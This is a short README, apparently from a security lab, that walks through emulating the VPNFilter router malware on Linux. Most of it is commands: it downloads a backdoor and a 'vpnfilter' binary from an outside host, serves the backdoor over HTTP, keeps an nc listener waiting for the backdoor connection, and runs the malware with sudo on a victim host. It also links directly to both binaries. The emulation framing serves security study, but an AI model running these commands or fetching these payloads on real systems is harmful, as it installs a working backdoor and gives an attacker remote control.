# VPNFilter attack 

This attack emulates VPNFilter malware behavior from a x86 Linux host.

## What is VPNFilter attack?

VPNFilter is malware designed to infect routers and certain network attached storage devices. As of 24 May 2018, it is estimated to have infected approximately 500,000 routers worldwide, though the number of at-risk devices is larger.[1] It can steal data, contains a "kill switch" designed to disable the infected router on command, and is able to persist should the user reboot the router.[2] The FBI believes that it was created by the Russian Fancy Bear group (APT 28). 

## Attack scenario preparation

* Victim host: A Linux host (Ubuntu)
* C2 host (Ubuntu): Host that will provide stage2 binary (backdoor client) from port 8000 and waiting for backdoor connection from port 9000.


## Launch attack

### C2 Server

* You need to set-up a webserver at port 9000  
```
$ mkdir server-file
$ cd server-files
$ wget http://www.syssec.org:9000/N9Qbh/bdoor
$ python -m SimpleHTTPServer 8000
```
    
* The following command should download the backdoor program
 ```
 wget <C2 ip address>:8000/bdoor
 ```
 
* From another console, run the following command to wait for the backdoor
```sh
while true 
do 
    nc -l -p 9000
    sleep 1
done
```
    
### Victim host

 1. Clean up files

```bash
/bin/rm -f /var/run/msvf.pid
/bin/rm -f/var/run/client_ca.crt
/bin/rm -f /var/run/client.crt
/bin/rm -f /var/run/client.key
```

2. Download VPNFilter to /tmp/

```
cd /tmp/
wget http://www.syssec.org:9000/GIKg8/vpnfilter
```
 
3. Run it with the following command

```bash
# You need to pass C2 host IP address via environment variable.
# Say C2 Host address is 1.2.3.4
$ sudo  IP1=1 IP2=2 IP3=3 IP4=4 /tmp/vpnfilter
```
   
## Resources
   
* [VPNFilter binary (vpnfilter)](http://www.syssec.org:9000/GIKg8/vpnfilter)
* [backdoor binary (bdoor)](http://www.syssec.org:9000/N9Qbh/bdoor)

###### tags: `vpnfilter`,`linux`,`attack`